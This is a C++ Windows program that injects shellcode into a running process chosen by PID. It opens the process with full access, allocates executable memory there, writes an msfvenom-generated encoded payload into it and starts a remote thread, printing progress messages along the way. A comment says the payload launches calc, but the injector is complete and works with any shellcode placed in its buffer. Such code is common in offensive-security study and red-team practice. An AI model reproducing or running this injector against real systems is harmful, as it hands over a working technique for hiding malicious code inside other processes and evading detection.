#include <iostream>
#include <windows.h>

// OpenProcess() --> VirtualAllocEx() --> WriteProcessMemory() --> CreateRemoteThread()

PVOID rBuffer;
HANDLE rThread;
HANDLE hProcess;

int main(int argc, char* argv[]) {

	// msfvenom --platform windows --arch x64 -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" -f c

	unsigned char buf[] =
		"\x48\x31\xc9\x48\x81\xe9\xde\xff\xff\xff\x48\x8d\x05\xef"
		"\xff\xff\xff\x48\xbb\x7f\xeb\x9c\xb4\x20\x82\xb0\x16\x48"
		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x83\xa3\x1f"
		"\x50\xd0\x6a\x70\x16\x7f\xeb\xdd\xe5\x61\xd2\xe2\x47\x29"
		"\xa3\xad\x66\x45\xca\x3b\x44\x1f\xa3\x17\xe6\x38\xca\x3b"
		"\x44\x5f\xa3\x17\xc6\x70\xca\xbf\xa1\x35\xa1\xd1\x85\xe9"
		"\xca\x81\xd6\xd3\xd7\xfd\xc8\x22\xae\x90\x57\xbe\x22\x91"
		"\xf5\x21\x43\x52\xfb\x2d\xaa\xcd\xfc\xab\xd0\x90\x9d\x3d"
		"\xd7\xd4\xb5\xf0\x09\x30\x9e\x7f\xeb\x9c\xfc\xa5\x42\xc4"
		"\x71\x37\xea\x4c\xe4\xab\xca\xa8\x52\xf4\xab\xbc\xfd\x21"
		"\x52\x53\x40\x37\x14\x55\xf5\xab\xb6\x38\x5e\x7e\x3d\xd1"
		"\x85\xe9\xca\x81\xd6\xd3\xaa\x5d\x7d\x2d\xc3\xb1\xd7\x47"
		"\x0b\xe9\x45\x6c\x81\xfc\x32\x77\xae\xa5\x65\x55\x5a\xe8"
		"\x52\xf4\xab\xb8\xfd\x21\x52\xd6\x57\xf4\xe7\xd4\xf0\xab"
		"\xc2\xac\x5f\x7e\x3b\xdd\x3f\x24\x0a\xf8\x17\xaf\xaa\xc4"
		"\xf5\x78\xdc\xe9\x4c\x3e\xb3\xdd\xed\x61\xd8\xf8\x95\x93"
		"\xcb\xdd\xe6\xdf\x62\xe8\x57\x26\xb1\xd4\x3f\x32\x6b\xe7"
		"\xe9\x80\x14\xc1\xfc\x9a\x83\xb0\x16\x7f\xeb\x9c\xb4\x20"
		"\xca\x3d\x9b\x7e\xea\x9c\xb4\x61\x38\x81\x9d\x10\x6c\x63"
		"\x61\x9b\x62\xad\x3c\x75\xaa\x26\x12\xb5\x3f\x2d\xe9\xaa"
		"\xa3\x1f\x70\x08\xbe\xb6\x6a\x75\x6b\x67\x54\x55\x87\x0b"
		"\x51\x6c\x99\xf3\xde\x20\xdb\xf1\x9f\xa5\x14\x49\xd7\x41"
		"\xee\xd3\x16";

	if (argv[1] == NULL) {
		
		printf("[!] you must supply a pid to inject to");
		exit(1);

	}
	
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	
	if (hProcess == NULL) {
		printf("[!] couldn't attach to %i", atoi(argv[1]));
		exit(1);
	}

	printf("\n[+] attached to process");

	WCHAR procPath[MAX_PATH];
	DWORD procSize = MAX_PATH;

	if (QueryFullProcessImageNameW(
		hProcess,
		0, // DON'T SET THIS TO PROCESS_NAME_NATIVE (0x00000001)
		procPath,
		&procSize)
		) {

		printf("\n[+] process_path = %ls", procPath);

		WCHAR* exeName = wcsrchr(procPath, L'\\');
		if (exeName == NULL) {
			printf("[!] unable to extract name from path");
			exeName = procPath;
		}

		else {
			exeName++;
		}

		printf("\n[+] process_name = %ls", exeName);
	}

	else {
		printf("\n[!] something went wrong. you're on your own. good luck.");
		exit(1);
	}

	DWORD arch;
	if (!GetBinaryTypeW(procPath, &arch)) {
		printf("[!] failed to get binary arch.");
	}

	switch (arch) {

	case SCS_32BIT_BINARY:
		printf("\n[+] process_architecture = 32-bit");
		break;

	case SCS_64BIT_BINARY:
		printf("\n[+] process_architecture = 64-bit");
		break;

	case SCS_WOW_BINARY:
		printf("\n[+] process_architecture = 16-bit");
		break;

	default:
		printf("[!] process_architecture = UNKNOWN.");
		break;
	}

	DWORD PROCID = GetProcessId(hProcess);
	printf("\n[+] process_id = %i", PROCID);

	DWORD PROCVERSION = GetProcessVersion(PROCID);
	printf("\n[+] process_version = %lu", PROCVERSION);

	printf("\n[+] size of shellcode: %i", (unsigned int) sizeof(buf));
	printf("\n[*] starting injection...");
	printf("\n[*] allocating memory          ---> VirtualAllocEx()");
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	/*
	LPVOID VirtualAllocEx(
	  [in]           HANDLE hProcess,
	  [in, optional] LPVOID lpAddress,
	  [in]           SIZE_T dwSize,
	  [in]           DWORD  flAllocationType,
	  [in]           DWORD  flProtect
	);
	*/

	printf("\n[+] writing to process memory  ---> WriteProcessMemory()");
	WriteProcessMemory(hProcess, rBuffer, buf, sizeof(buf), NULL);

	/*
	BOOL WriteProcessMemory(
	  [in]  HANDLE  hProcess,
	  [in]  LPVOID  lpBaseAddress,
	  [in]  LPCVOID lpBuffer,
	  [in]  SIZE_T  nSize,
	  [out] SIZE_T  *lpNumberOfBytesWritten
	);
	*/

	printf("\n[+] creating the remote thread ---> CreateRemoteThread()");
	rThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, NULL);

	/*
	HANDLE CreateRemoteThread(
	  [in]  HANDLE                 hProcess,
	  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	  [in]  SIZE_T                 dwStackSize,
	  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
	  [in]  LPVOID                 lpParameter,
	  [in]  DWORD                  dwCreationFlags,
	  [out] LPDWORD                lpThreadId
	);
	*/

	printf("\n[+] closing the process handle now, enjoy!\n");
	CloseHandle(hProcess);

	return 0;
